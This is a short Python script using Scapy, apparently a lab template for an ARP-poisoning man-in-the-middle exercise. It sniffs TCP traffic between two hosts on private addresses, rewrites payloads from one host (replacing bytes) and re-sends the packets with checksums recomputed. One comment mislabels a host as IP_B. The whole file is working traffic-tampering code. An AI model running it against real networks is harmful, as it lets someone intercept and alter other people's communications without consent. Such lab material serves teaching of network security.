#!/usr/bin/env python3
from scapy.all import *

# Define the IP and MAC addresses of the two hosts
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_C = "10.9.0.7"
MAC_C = "02:42:0a:09:00:07"

def spoof_pkt(pkt):
    # Check if the packet has an IP layer and TCP layer
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_C:
            # Create a new packet based on the captured one.
            # 1) We need to delete the checksum in the IP & TCP headers
            # because our modification will make them invalid.
            # Scapy will recalculate them if these fields are missing.
            # 2) We also delete the original TCP payload to modify it.
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)
            # Construct the new payload based on the old payload.
            # You need to modify this section to change the payload as needed.
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load  # Original payload data
                newdata = data.replace(b"A",b"X")  # Modify data here as required
                print(f"{data}")
                send(newpkt/newdata)
            else:
                send(newpkt)

        elif pkt[IP].src == IP_C and pkt[IP].dst == IP_A:
            # For packets from IP_B to IP_A, do not modify the payload
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt)

# Filter packets on the TCP protocol
f = 'tcp'

# Start sniffing on the specified interface with the TCP filter
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
